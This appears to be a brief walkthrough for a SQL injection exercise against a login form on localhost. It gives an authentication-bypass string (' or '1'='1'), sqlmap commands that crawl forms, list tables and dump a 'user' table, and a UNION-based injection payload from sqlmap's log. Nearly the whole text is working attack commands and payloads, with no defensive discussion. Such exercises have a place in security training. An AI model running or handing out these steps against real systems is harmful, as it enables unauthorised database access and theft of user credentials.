# 1. username=admin, password=unknown' or '1'='1

# 2. Run `sqlmap -u "http://localhost:8080" --forms --crawl=2`. Log will show injection points are two: username and password

# 3. Run `sqlmap -u "http://localhost:8080" --forms --crawl=2 --tables`

# 4. Run `sqlmap -u "http://localhost:8080" --forms --crawl=2 --tables user --dump`

# 5. From log, find what looks like this:

    Title: Generic UNION query (NULL) - 1 column
    Payload: username=admin&password=OdIo' UNION ALL SELECT CONCAT(CONCAT('qzbkq','tQIkTWFkXrMVhvrqWOCuEXpEyuHPVVWjxqisGIdE'),'qppzq')-- TaxT
